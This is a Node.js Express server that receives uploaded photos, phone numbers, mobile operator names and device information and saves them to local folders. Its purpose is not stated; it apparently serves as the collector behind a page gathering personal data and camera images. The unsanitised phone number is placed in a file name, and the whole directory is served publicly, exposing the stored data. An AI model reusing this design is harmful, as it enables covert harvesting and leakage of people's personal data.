const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.json({ limit: '10mb' })); // For parsing application/json, increase limit for image data
app.use(bodyParser.urlencoded({ extended: true })); // For parsing application/x-www-form-urlencoded

// Serve static files (HTML, CSS, JS)
app.use(express.static(path.join(__dirname)));

// Ensure directories for storing data exist
const dataDir = path.join(__dirname, 'userData');
const photosDir = path.join(__dirname, 'userPhotos');

if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}
if (!fs.existsSync(photosDir)) {
    fs.mkdirSync(photosDir, { recursive: true });
}

// Endpoint to handle form submissions and device info
app.post('/api/submit-data', (req, res) => {
    const data = req.body;
    console.log('Received data:', JSON.stringify(data, null, 2));

    if (data.type === 'photo' && data.photo) {
        // Handle photo data
        try {
            const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
            const photoFileName = `photo_${Date.now()}.jpeg`;
            const photoPath = path.join(photosDir, photoFileName);
            
            fs.writeFile(photoPath, base64Data, 'base64', (err) => {
                if (err) {
                    console.error('Error saving photo:', err);
                    return res.status(500).json({ message: 'Error saving photo', error: err.message });
                }
                console.log('Photo saved:', photoPath);
                res.status(200).json({ message: 'Photo received and saved successfully', photoPath });
            });
        } catch (error) {
            console.error('Error processing photo data:', error);
            res.status(500).json({ message: 'Error processing photo data', error: error.message });
        }
    } else if (data.phoneNumber && data.operator) {
        // Handle form data (phone number, operator, device info)
        const dataFileName = `userInfo_${data.phoneNumber}_${Date.now()}.json`;
        const dataFilePath = path.join(dataDir, dataFileName);

        fs.writeFile(dataFilePath, JSON.stringify(data, null, 2), (err) => {
            if (err) {
                console.error('Error saving user data:', err);
                return res.status(500).json({ message: 'Error saving user data', error: err.message });
            }
            console.log('User data saved:', dataFilePath);
            res.status(200).json({ message: 'Data received and saved successfully', filePath: dataFilePath });
        });
    } else {
        res.status(400).json({ message: 'Invalid data received' });
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
    console.log('Serving files from:', __dirname);
    console.log(`User data will be saved in: ${dataDir}`);
    console.log(`User photos will be saved in: ${photosDir}`);
});